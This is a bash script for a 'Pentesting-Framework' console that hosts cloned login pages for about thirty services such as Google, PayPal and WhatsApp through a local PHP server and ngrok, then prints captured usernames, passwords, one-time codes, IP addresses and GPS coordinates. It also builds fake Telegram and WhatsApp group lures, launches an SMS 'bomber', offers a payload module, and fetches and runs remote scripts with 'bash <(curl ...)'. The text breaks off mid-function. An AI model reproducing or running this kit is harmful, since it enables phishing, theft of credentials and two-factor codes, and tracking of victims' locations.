#!/usr/bin/env bash

#┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
#┃ Project : Pentesting-Framework                            ┃
#┃ Author  : ABHacker Official                               ┃
#┃ Version : 6.0 (Latest)                                    ┃
#┃ Github  : abhackerofficial <github.com/abhackerofficial>  ┃
#┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

__return__ () {
source __return__ &> /dev/null
if [[ ! $? == 105 ]]
then
printf 105
fi
}

set +x

__return__=$(printf "$(__return__)")

WAIT() {
sleep 0.01
}

OS=$(uname -o | grep -o "Android")

declare -a XSITES=(
'Google.OTP'
'Facebook.OTP'
'Instagram.OTP'
'Pinterest.OTP'
'Amazon.OTP'
'Twitch.OTP'
'Snapchat.OTP'
'Ebay.OTP'
'Linkedin.OTP'
'Netflix.OTP'
'Paytm.OTP'
'Gitlab.OTP'
'CryptoCurrency.OPT'
'Instafollow.OTP'
'Protonmail.OTP'
'Yahoo.OTP'
'Paypal.OTP'
'Telegram.OTP'
'Mobikwik.OTP'
'Wordpress.OTP'
'Hotstar.OTP'
'Flipkart.OTP'
'Twitter.OTP'
'Spotify.OTP'
'Phonepay.OTP'
'StackoverFlow.OTP'
'WhatsApp.OTP'
'Tiktok.OTP'
'Ajio.OTP'
'Uber.OTP'
)

declare -a SITES=(
Google
Facebook
Microsoft
Instagram
DeviantArt
Pinterest
Badoo
Twitch
Snapchat
Ebay
Linkedin
DropBox
Netflix
Mediafire
Gitlab
Github
Yahoo
Paypal
Quora
Wordpress
Steam
Yandex
Twitter
Spotify
StackoverFlow
Playstation
Reddit
Tiktok
Adobe
Xbox
)

declare -a GSITES=(
NearYou
Telegram
WhatsApp
Gdrive
)

# Variable

export RAWLINK=https://raw.githubusercontent.com/abhackerofficial/pentesting-framework/master
export GITLINK=https://github.com/abhackerofficial/pentesting-framework
export OUTPUT=$HOME/.history.psf
XWEBPAGE=${#XSITES[@]}
GWEBPAGE=${#GSITES[@]}
WEBPAGE=${#SITES[@]}
CWD=$(pwd)
MODULE=05
VAR=6.0
ARG=$1
NUM=1

# Colors

C0="$(printf '\033[90m')"
C1="$(printf '\033[91m')"
C2="$(printf '\033[92m')"
C3="$(printf '\033[93m')"
C4="$(printf '\033[94m')"
C5="$(printf '\033[95m')"
C6="$(printf '\033[96m')"
C7="$(printf '\033[97m')"
R0="$(printf '\033[00m')"
R1="$(printf '\033[01m')"
R2="$(printf '\033[02m')"
R3="$(printf '\033[03m')"
R4="$(printf '\033[04m')"
R5="$(printf '\033[05m')"

# Sign

r0SIGN="${C1}(${R0}>${C1})${R0}"
r1SIGN="${C1}(${R0}!${C1})${R0}"

g0SIGN="${C2}(${R0}>${C2})${R0}"
g1SIGN="${C2}(${R0}!${C2})${R0}"

b0SIGN="${C4}(${R0}>${C4})${R0}"
b1SIGN="${C4}(${R0}!${C4})${R0}"

# System Checker

function screenSize() {
    if ! hash tput &> /dev/null
    then
    apt install -y ncurses-utils
    fi

      SIZE=$(tput cols)

                if [ ! ${SIZE} -gt "60" ]
                then
                printf "\nYour Terminal Window Size must be above ${C2}60${R0} >= ${C1}${SIZE}${R0}\nPinch two fingers together on the screen to zoom out.\n"
                fi
}

if [[ $OS == *'Android'* ]];then
screenSize
TMPDIR=/data/data/com.termux/files/usr/tmp
pm() {
apt install -y $1
}
else
TMPDIR=/tmp
# Package Managers
    distro=$(source /etc/os-release && echo $ID)
    case $distro in
        arch)
            pm() {
		sudo pacman -Sy --noconfirm $1
		}
            ;;
        ubuntu)
            pm() {
		sudo apt-get install -y $1
		}
            ;;
        linuxmint)
            pm() { sudo apt-get install -y $1
		}
            ;;
        kali)
            pm() { sudo apt-get install -y $1
		}
            ;;
        parrot)
            pm() { sudo apt-get install -y $1
		}
            ;;
        debian)
            pm() { sudo apt-get install -y $1
		}
            ;;
        void)
            pm() { sudo xbps-install $1
		}
            ;;
        manjaro)
            pm() { sudo pacman -Sy $1
		}
            ;;
        garuda)
            pm() { sudo pacman -Sy $1
		}
            ;;
        alpine)
            pm() { sudo apk add $1
		}
            ;;
        gentoo)
            pm() { sudo emerge --ask $1
		}
            ;;
        fedora)
            pm() { sudo dnf install -y $1
		}
            ;;
        predator)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        artix)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        puppy_fossapup64)
            pm() { sudo pkg -d $1 && sudo pkg -i $1
		}
            ;;
        raspbian)
            pm() { sudo apt install -y $1
		}
            ;;
        endeavouros)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        freebsd)
            pm() { sudo pkg install -y $1
		}
            ;;
        *)
          echo "Sorry, but your System doesn't support [package manager] !"
          # Add manualy to use package manager to start psfconsole !
            exit 0
            ;;
    esac
fi

if ! hash svn &> /dev/null
then
pm subversion
elif ! hash php &> /dev/null
then
pm php
elif ! hash git &> /dev/null
then
pm git
elif ! hash jq &> /dev/null
then
pm jq
elif ! hash curl &> /dev/null
then
pm curl
elif ! hash python &> /dev/null
then
pm python
fi

if ! hash svn php git jq curl python &> /dev/null
then
printf "${C1}\e[1mE:${R0} Unable to run psfconsole right now Cause :\n"
printf "${C1}\e[1mE:${R0} Dependencies are not Installed yet (psfconsole)\n"
exit 1
fi

sudoPERM() {
if [[ $OS == *'Android'* ]];then
:
else
sudo -v
fi
}

killZONE() {
if [[ ! $__return__ == 105 ]];then
bash assets/programs/progress.kill
else
bash <(curl -sL "${RAWLINK}/assets/programs/progress.kill")
fi
}

cacheFILES() {
if [[ ${MODE} == "withOTP" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${XSITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "nonOTP" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withGPS" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${GSITES[${input} -1]}" &> /dev/null
fi
}

interrupt () {
exit_on_signal_SIGINT () { killZONE
if [[ ! $__return__ == 105 ]];then
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == "${SITENUM}" ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
cacheFILES
fi
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
else
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
fi
}

exit_on_signal_SIGTSTP () { killZONE
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == "${SITENUM}" ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
cacheFILES
fi
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
else
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
fi
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTSTP SIGTSTP
}

# <<<--- Help Mode --->>>

helpCOMMANDS () {
echo -e "
${C4}Available Commands${R0}
================

    Command     Description
    -------     -----------
    ${C2}use${R0}         This command is used to call existing module(s).
    ${C2}list${R0}        Launch a list of existing module(s).
    ${C2}exit${R0}        Exit Pentesting Framework instance.
    ${C2}clear${R0}       Clear screen.
    ${C2}banner${R0}      Shows a random banner.

    Available Modules           Description
    -----------------------     -----------
    ${C2}use non:otp/handler${R0}         module to run non:otp phishing site(s).
    ${C2}use with:otp/handler${R0}        module to run with:otp phishing site(s).
    ${C2}use with:gps/handler${R0}        module to create geolocation phishing site(s).
    ${C2}use with:info/handler${R0}       module to gather information of user(s).
    ${C2}use with:bomber/handler${R0}     module to perform a bombing attack.
    ${C2}use with:payload/handler${R0}    module to create a metasploit payload for your target device(s).

    Upcomming Modules          Description
    -----------------------    -----------
    ${C6}use with:brute/handler${R0}     module to perform a bruteforce attack.

${C4}psfconsole${R0}
==========

\`psfconsole\` is a bundle of penetration testing tools and an interface to Pentesting Framework.
This framework is currently undergoing heavy development. So, please be patient and keep an eye on this space!
"
}

# <<<--- Installer --->>>

if [[ ${ARG} == "-i" || ${ARG} == "--install" ]];then
source <(curl -sLo- "${RAWLINK}/assets/programs/setup.psfconsole")
exit 0

elif [[ ${ARG} == "-u" || ${ARG} == "--update" ]];then
source <(curl -sLo- "${RAWLINK}/assets/programs/update.psfconsole")
exit 0

elif [[ ${ARG} == "-r" || ${ARG} == "--remove" ]];then
source <(curl -sLo- "${RAWLINK}/assets/programs/remove.psfconsole")
exit 0
fi

user_data() {
#random_ip=$(shuf -i 0-1 -n 1)
if [ -f "ip.txt" ]
then
ip=$(cat ip.txt | awk NR==2 | cut -d " " -f2)
fetch=$(cat ip.txt | awk NR==3)
user=$(printf "${fetch# User-Agent:}")

echo -e "${g0SIGN} IP Address : ${ip}"
echo -e "${g0SIGN} User Agent :${user}\n"
fi
rm ip.txt &> /dev/null
}

Xcredentials() {
user=$(grep -o 'Username:.*' log.txt | awk NR==1 | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' log.txt | awk NR==1 | cut -d ":" -f2)
otp=$(grep -o 'OTP:.*' log.txt | awk NR==1 | cut -d " " -f2)

if [[ ! ${#user} == 0 ]]
then
echo -e "${g0SIGN} Username : ${user}"
fi

if [[ ! ${#pass} == 0 ]]
then
if [[ ! ${pass} == " " ]]
then
echo -e "${g0SIGN} Password :${pass}"
fi
fi

if [[ ! ${#otp} == 0 ]]
then
if [[ ! ${otp} == " " ]]
then
echo -e "${g0SIGN} Otp Code : ${otp}\n"
fi
fi
rm log.txt &> /dev/null
}

function XcredentialLoop () {
while true
do
if [ -f "ip.txt" ]
then
user_data
fi
if [ -f "log.txt" ]
then
Xcredentials
fi
done
}

credentials() {
user=$(grep -o 'Username:.*' usernames.txt | awk NR==1 | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' usernames.txt | awk NR==1 | cut -d ":" -f2)

if [[ ! ${#user} == 0 ]]
then
echo -e "${g0SIGN} Username : ${user}"
fi

if [[ ! ${#pass} == 0 ]]
then
if [[ ! ${pass} == " " ]]
then
echo -e "${g0SIGN} Password :${pass}\n"
fi
fi
rm usernames.txt &> /dev/null
}

function credentialLoop () {
while true
do
if [ -f "ip.txt" ]
then
user_data
fi
if [ -f "usernames.txt" ]
then
credentials
fi
done
}

Gcredentials() {
latitude=$(cat result.txt | cut -d '"' -f6)
longitude=$(cat result.txt | cut -d '"' -f10)

if [ -f "info.txt" ]
then
info=$(sed "s/,/, /g" info.txt | tr -d '{}"[]\\')
fi

if [[ ! ${#info} == 0 ]]
then
echo -e "${g0SIGN} Information : ${info}\n"
fi

if [[ ! ${#latitude} == 0 || ! ${#longitude} == 0 ]]
then
echo -e "${g0SIGN} Latitude : ${latitude}"
echo -e "${g0SIGN} Longitude : ${longitude}"
echo -e "${g0SIGN} Google Maps : ${R4}https://www.google.com/maps/place/${latitude}+${longitude}${R0}\n"
fi
rm result.txt &> /dev/null
rm info.txt &> /dev/null
}

function GcredentialLoop () {
while true
do
if [[ -f "result.txt" ]]
then
Gcredentials
fi
done
}


# <<<--- Argument Mode ! --->>>

if [[ ${ARG} == "-s" || ${ARG} == "--site" ]];then
  if [[ ${2} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
      if [[ ${2} -lt 31 ]]
       then interrupt
       SITENUM="${SITES[${2} -1]}"
       echo -e "${b0SIGN} Webpage : ${SITENUM}"
       if [[ ! $__return__ == 105 ]];then
       cd ${CWD}/server
       SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
       cd - &> /dev/null
       bash ${CWD}/assets/programs/ngrok.installer
       source ${CWD}/assets/programs/ngrok.configure
       cp -rf  "${CWD}"/websites/nonOTP/"${SITES[${2} -1]}" "${CWD}/server"
       cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${2} -1]}"
       cd "${SCRIPT_PATH[@]}"/"${SITES[${2} -1]}"
       php -S localhost:8080 > /dev/null 2>&1 &
       echo -e "\n${b0SIGN} Credentials details visible here !\n"
       credentialLoop
       else
       cd $TMPDIR
       if [ ! -d "$TMPDIR/server" ]
       then
       mkdir -p ${TMPDIR}/server
       fi
       cd server
       if [[ ! -d "${SITES[${2} -1]}" ]]
       then
       printf "${b0SIGN} Downloading webpage Template...\r"
       svn checkout ${GITLINK}/trunk/websites/nonOTP/"${SITES[${2} -1]}" &> /dev/null
       fi
       cd ..
       cd ${TMPDIR}/server/"${SITES[${2} -1]}"
       printf "${b0SIGN} Downloading Programs for Starting Server...\r"
       curl -sLO ${RAWLINK}/server/ip.php
       cd - &> /dev/null
       bash <(curl -sL "${RAWLINK}/assets/programs/ngrok.installer")
       source <(curl -sLo- "${RAWLINK}/assets/programs/ngrok.configure")
       cd ${TMPDIR}/server/"${SITES[${2} -1]}"
       php -S localhost:8080 > /dev/null 2>&1 &
       echo -e "\n${b0SIGN} Credentials details visible here !\n"
       credentialLoop
      fi
  fi
  else
  echo "(>) Choose Site as given Number !"
  exit 1
fi
exit 0
fi

randomBANNER() {
RANDOMs=$(echo $((1 + $RANDOM % 10)))
if [[ ! $__return__ == 105 ]];then
bash assets/logos/logo."${RANDOMs}"
else
bash <(curl -sL "${RAWLINK}/assets/logos/logo.${RANDOMs}")
fi
}

randomTIP() {
RANDOMs=$(echo $((1 + $RANDOM % 2)))

case ${RANDOMs} in
1)
       printf "Psfconsole tip: When in a module, use ${C2}back${R0} to go\n";WAIT
       printf "back to the top level prompt\n\n";WAIT
       ;;
2)
       printf "Psfconsole tip: You can use ${C2}help${R0} to view all\n";WAIT
       printf "available commands and modules.\n\n";WAIT
       ;;
esac
}

theHEADER() {
randomBANNER
printf "+ -- --=[  ${C3}psfconsole release v${VAR}${R0} ]=-- -- +\n";WAIT
printf "+ -- --=[  ${C2}${MODULE} modules available ! ${R0} ]=-- -- +\n\n";WAIT
randomTIP
}

theHEADER

list0() {
echo
for i in {0..8}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${XSITES[i]}\n"
  WAIT
done

for i in {9..29}
  do
  printf "${C4}(${R0}$((i+1))${C4})${R0} ${XSITES[i]}\n"
  WAIT
done
echo
}

list1() {
echo
for i in {0..8}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done

for i in {9..29}
  do
  printf "${C4}(${R0}$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done
echo
}

list2() {
echo
for i in {0..3}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${GSITES[i]}\n"
  WAIT
done
echo
}

withOTP() {
function setupRecourses () {
MODE=withOTP
if [[ ! $__return__ == 105 ]];then
   cd ${CWD}/server || exit 1
   SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
   cd - &> /dev/null || exit 1
   bash ${CWD}/assets/programs/ngrok.installer
   source ${CWD}/assets/programs/ngrok.configure
else
   cd $TMPDIR || exit 1
   if [ ! -d "$TMPDIR/server" ]
   then
   mkdir -p ${TMPDIR}/server
   fi
   cd server || exit 1
   if [[ ! -d "${XSITES[${input} -1]}" ]]
   then
   printf "${b0SIGN} Downloading webpage Template...\r"
   svn checkout ${GITLINK}/trunk/websites/withOTP/"${XSITES[${input} -1]}" &> /dev/null
   fi
   cd ..
   cd ${TMPDIR}/server/"${XSITES[${input} -1]}" || exit 1
   printf "${b0SIGN} Downloading Programs for Starting Server...\r"
   curl -sLO ${RAWLINK}/server/ip.php
   cd - &> /dev/null || exit 1
   bash <(curl -sL "${RAWLINK}/assets/programs/ngrok.installer")
   source <(curl -sLo- "${RAWLINK}/assets/programs/ngrok.configure")
fi
}

function setupServer () {
if [ ${#link} == 0 ]
then
exit 1
fi
sleep 0.5

if [[ ! $__return__ == 105 ]];then
cp -rf  "${CWD}"/websites/withOTP/"${XSITES[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${XSITES[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${XSITES[${input} -1]}" || exit 1
else
cd ${TMPDIR}/server/"${XSITES[${input} -1]}" || exit 1
fi
}

function startServer () {
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n${b0SIGN} Credentials details visible here !\n"
}


# <<<--- Input Mode ! --->>>

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
then
  if [[ ${input} -lt 31 ]]
   then
       setupRecourses
       setupServer
       startServer
       XcredentialLoop
  fi
fi
}


nonOTP() {
function setupRecourses () {
MODE=nonOTP
if [[ ! $__return__ == 105 ]];then
   cd ${CWD}/server || exit 1
   SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
   cd - &> /dev/null || exit 1
   bash ${CWD}/assets/programs/ngrok.installer
   source ${CWD}/assets/programs/ngrok.configure
else
   cd $TMPDIR || exit 1
   if [ ! -d "$TMPDIR/server" ]
   then
   mkdir -p ${TMPDIR}/server
   fi
   cd server || exit 1
   if [[ ! -d "${SITES[${input} -1]}" ]]
   then
   printf "${b0SIGN} Downloading webpage Template...\r"
   svn checkout ${GITLINK}/trunk/websites/nonOTP/"${SITES[${input} -1]}" &> /dev/null
   fi
   cd .. || exit 1
   cd ${TMPDIR}/server/"${SITES[${input} -1]}" || exit 1
   printf "${b0SIGN} Downloading Programs for Starting Server...\r"
   curl -sLO ${RAWLINK}/server/ip.php
   cd - &> /dev/null || exit 1
   bash <(curl -sL "${RAWLINK}/assets/programs/ngrok.installer")
   source <(curl -sLo- "${RAWLINK}/assets/programs/ngrok.configure")
fi
}

function setupServer () {
if [ ${#link} == 0 ]
then
exit 1
fi
sleep 0.5

if [[ ! $__return__ == 105 ]];then
cp -rf  "${CWD}"/websites/nonOTP/"${SITES[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" || exit 1
else
cd ${TMPDIR}/server/"${SITES[${input} -1]}" || exit 1
fi 
}

function startServer () {
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n${b0SIGN} Credentials details visible here !\n"
}


# <<<--- Input Mode ! --->>>

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
then
  if [[ ${input} -lt 31 ]]
   then
       setupRecourses
       setupServer
       startServer
       credentialLoop
  fi
fi
}

withGPS() {
function setupRecourses () {
MODE=withGPS
if [[ ! $__return__ == 105 ]];then
   cd ${CWD}/server || exit 1
   SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
   cd - &> /dev/null || exit 1
   bash ${CWD}/assets/programs/ngrok.installer
   source ${CWD}/assets/programs/ngrok.configure
else
   cd $TMPDIR || exit 1
   if [ ! -d "$TMPDIR/server" ]
   then
   mkdir -p ${TMPDIR}/server
   fi
   cd server || exit 1
   if [[ ! -d "${GSITES[${input} -1]}" ]]
   then
   printf "${b0SIGN} Downloading webpage Template...\r"
   svn checkout ${GITLINK}/trunk/websites/withGPS/"${GSITES[${input} -1]}" &> /dev/null
   fi
   cd ..
   cd ${TMPDIR}/server/"${GSITES[${input} -1]}" || exit 1
   printf "${b0SIGN} Downloading Programs for Starting Server...\r"
   curl -sLO ${RAWLINK}/server/ip.php
   cd - &> /dev/null || exit 1
   bash <(curl -sL "${RAWLINK}/assets/programs/ngrok.installer")
   source <(curl -sLo- "${RAWLINK}/assets/programs/ngrok.configure")
fi
}

function setupServer () {
if [ ${#link} == 0 ]
then
exit 1
fi
sleep 0.5

if [[ ! $__return__ == 105 ]];then
cp -rf  "${CWD}"/websites/withGPS/"${GSITES[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${GSITES[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${GSITES[${input} -1]}" || exit 1
else
cd ${TMPDIR}/server/"${GSITES[${input} -1]}" || exit 1
fi
}

function startServer () {
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n${b0SIGN} Credentials details visible here !\n"
}

# <<<--- Input Mode ! --->>>

programA() {
setupRecourses
setupServer
}

programB() {
startServer
GcredentialLoop
}

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
then
  if [[ ${input} == 1 ]]
   then
      programA
      programB

  elif [[ ${input} == 2 ]]
   then
      programA
      printf "\n${b0SIGN} Enter Telegram Group Name : "
      read -r tURL
      sed -i "s,GROUP_NAME,${tURL},g" index.html
      printf "${b0SIGN} Enter Path for Group Image : "
      read -r image
      if [[ -f "${image}" ]]
      then
      getNAME=$(echo $(basename ${image}))
      sed -i "s,GROUP_IMAGE,${getNAME},g" index.html
      cp "${image}" images
      else
      printf "${r1SIGN} Wrong Image file type\n"
      exit 1
      fi
      printf "${b0SIGN} Enter Description of Telegram Group : "
      read -r description
      sed -i "s,DESCRIPTION,${description},g" index.html
      printf "${b0SIGN} Enter Total Members of Telegram Group : "
      read -r total
      sed -i "s,TOTAL,${total},g" index.html
      printf "${b0SIGN} Enter Available Members of Telegram Group : "
      read -r available
      sed -i "s,AVAILABLE,${available},g" index.html
      sleep 0.5
      programB

  elif [[ ${input} == 3 ]]
   then
      programA
      printf "\n${b0SIGN} Enter WhatsApp Group Name : "
      read -r wURL
      sed -i "s,GROUP_NAME,${wURL},g" index.html
      printf "${b0SIGN} Enter Path for Group Image : "
      read -r image
      if [[ -f "${image}" ]]
      then
      getNAME=$(basename "${image}")
      sed -i "s,GROUP_IMAGE,${getNAME},g" index.html
      cp ${image} images
      else
      printf "${r1SIGN} Wrong Image file type\n"
      exit 1
      fi
      sleep 0.5
      programB

  elif [[ ${input} == 4 ]]
   then
      programA
      printf "\n${b0SIGN} Input a Google Drive Link : "
      read -r gURL
      sed -i "s,REDIRECT_URL,${gURL},g" js/location.js
      sleep 0.5
      programB
  fi
fi
}

function psfHISTORY () {
NUM=1

if [[ ! -f $OUTPUT ]]
 then
 touch $OUTPUT
fi

LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')

overHISTORY() {
TOT=$((LOG-30))
sed -n "${TOT},${LOG}p" $OUTPUT > .temp.history.psf && mv .temp.history.psf $OUTPUT
}

if [[ ${LOG} -gt 50 ]]
then
cd $HOME || exit 1
overHISTORY
LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')
fi


i=1

fetch() {
while [ $i -le "${LOG}" ]
do
printf "...\n"
((i++))
done
}

FETCH=$(printf "$(fetch)")

declare -a LOGS=(
$(printf "${FETCH}")
)

historyLOOP() {
for i in "${LOGS[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  FILE=$(cat "$OUTPUT" | awk NR==${LOOP})
  history -s "${FILE}"
  ((NUM++))
  rm fetch.db &> /dev/null
  done
}
  historyLOOP
  LOOP=0
}

psf() {
psfHISTORY
#read -e -p $'\e[4mpsf\e[0m > \e[0m' command
read -r -e -p  "psf > " command
if [ ${#command} -gt 0 ]
then
if [[ $(cat "${OUTPUT}") == *"${command}"* ]]
then
sed -i "s,$command,,g" "$OUTPUT" | sed -i '/^$/d' "$OUTPUT"
sed -i "s,$command,,g" "$OUTPUT" | sed -i '/^$/d' "$OUTPUT"
echo "${command}" >> "$OUTPUT"
else
echo "${command}" >> "$OUTPUT"
fi
fi
}

showERROR() {
echo -e "${r0SIGN} Unsatisfied command ‘${@:1}’ :: execute '?'/'help'"
}

showHISTORY() {
while IFS= read -r line; do
    LOOP=$((${LOOP:-0}+1))
    printf "${LOOP}  $line\n"
done < "$OUTPUT"
LOOP=0
}

ignoreERROR() {
if [[ ${input} == "?" || ${input} == "help" ]]
then
   :

elif [[ ${input} == "list" ]]
then
   :

elif [[ ${input} == "back" ]]
then
   :

elif [[ ${input} == "banner" ]]
then
   :

elif [[ ${input} == "exit" ]]
then
   :

elif [[ ${input} == "q" ]]
then
   :

elif [[ ${input} == "clear" ]]
then
   :

else
  showERROR "$input"
  input=""
  fi
}

theERROR() {
command="$command"
  if [ ${#command} -gt 0 ]
   then
      showERROR $command
  fi

input="$input"

if [[ ${MODE} == "withBOMBER" ]]
then
  if [[ ${#input} -gt 0 ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withINFO" ]]
then
  if [[ ${#input} -gt 0 ]]
     then
      ignoreERROR
  fi
fi

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
 then
if [[ ${MODE} == "withOTP" ]]
then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "nonOTP" ]]
then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withGPS" ]]
then
  if [[ ! ${input} -lt "5" ]]
     then
      ignoreERROR
  fi
fi

else
   if [[ ${#input} -gt 0 ]]
   then
      ignoreERROR
   fi
fi
}

getCOMMANDS() {
  if [[ ${command} == "use with:otp/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use non:otp/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:gps/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:info/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:bomber/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:payload/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "?" || ${command} == "help" ]]
   then
      helpCOMMANDS
      command=""

elif [[ ${command} == "banner" ]]
   then
      theHEADER
      command=""

elif [[ ${command} == "list" ]]
   then
      echo -e "${g0SIGN} 'list' command only works with Modules! :: execute '?'/'help'"
      command=""

  elif [[ ${command} == "exit" ]]
   then
      echo -e "${g0SIGN} Existing psfconsole..."
      exit 0
      command=""

  elif [[ ${command} == "q" ]]
   then
      clear
      exit 0
      command=""

  elif [[ ${command} == "clear" ]]
   then
      clear
      command=""

elif [[ ${command} == "history" ]]
      then
          showHISTORY
          command=""
  fi
}

extarnalCMD() {
  if [[ ${input} == "?" || ${input} == "help" ]]
   then
       helpCOMMANDS

   elif [[ ${input} == "back" ]]
      then
while true
do
         readCOMMAND
done
elif [[ ${input} == "banner" ]]
      then
         theHEADER

elif [[ ${input} == "exit" ]]
      then
         echo -e "${g0SIGN} Existing psfconsole..."
         exit 0

elif [[ ${input} == "q" ]]
      then
         clear
         exit 0

elif [[ ${input} == "clear" ]]
      then
         clear
  fi
}

readCONFIGURE () {
  if [[ ${command} == "use with:otp/handler" ]]
  then
     MODE=withOTP
     echo -e "${b0SIGN} Using configured with:otp mode"
#     list0
     while true
     do
     printf "${R4}psf${R0} use(${C1}webpage/with:otp${R0})${R0} > "
     read -r input
     command=""
     theERROR
if [[ ${input} == "list" ]]
 then
    list0
fi

     extarnalCMD
     withOTP
     done

  elif [[ ${command} == "use non:otp/handler" ]]
  then
     MODE=nonOTP
     echo -e "${b0SIGN} Using configured non:otp mode"
#     list1
     while true
     do
     printf "${R4}psf${R0} use(${C1}webpage/non:otp${R0})${R0} > "
     read -r input
     command=""
     theERROR
if [[ ${input} == "list" ]]
 then
    list1
fi

     extarnalCMD
     nonOTP
     done

elif [[ ${command} == "use with:gps/handler" ]]
  then
     MODE=withGPS
     echo -e "${b0SIGN} Using configured with:gps mode"
#     list2
     while true
     do
     printf "${R4}psf${R0} use(${C1}webpage/with:gps${R0})${R0} > "
     read -r input
     command=""
     theERROR
if [[ ${input} == "list" ]]
 then
    list2
fi

     extarnalCMD
     withGPS
     done

elif [[ ${command} == "use with:bomber/handler" ]]
  then
     MODE=withBOMBER
     echo -e "${b0SIGN} Using configured with:bomber mode"
     while true
     do
     printf "${R4}psf${R0} use(${C1}program/with:bomber${R0})${R0} > "
     read -r input
     command=""
     if [[ $input == "list" ]]
     then
     echo -e "\n${b0SIGN} set bomber\n"
     elif [[ ${input} == "set bomber" ]]
     then
     input=""
case $(dpkg --print-architecture) in
    aarch64)
        if [[ ! $__return__ == 105 ]];then
       ./programs/withBOMBER/bomber.aarch64
        else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withBOMBER/bomber.aarch64 |
       printf "${b0SIGN} Downloading Program...\r"
       printf "                                              \r"
       chmod +x bomber.aarch64
       ./bomber.aarch64
       fi
        ;;
    arm*)
        if [[ ! $__return__ == 105 ]];then
       ./programs/withBOMBER/bomber.arm64
        else 
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withBOMBER/bomber.arm64 |
       printf "${b0SIGN} Downloading Program...\r"
       printf "                                              \r"
       chmod +x bomber.arm64
       ./bomber.arm64
       fi
        ;;
    amd*)
        if [[ ! $__return__ == 105 ]];then
       ./programs/withBOMBER/bomber.amd64
        else
       cd $TMPDIR
       curl -sLO ${RAWLINK}/programs/withBOMBER/bomber.amd64 |
       printf "${b0SIGN} Downloading Program...\r"
       printf "                                              \r"
       chmod +x bomber.amd64
       ./bomber.amd64
       fi
        ;;
esac

       fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:info/handler" ]]
  then
     MODE=withINFO
     echo -e "${b0SIGN} Using configured with:info mode"
     while true
     do
     printf "${R4}psf${R0} use(${C1}program/with:info${R0})${R0} > "
     read -r input
     command=""
     if [[ $input == "list" ]]
     then
     echo -e "\n${b0SIGN} set info\n"
     elif [[ ${input} == "set info" ]]
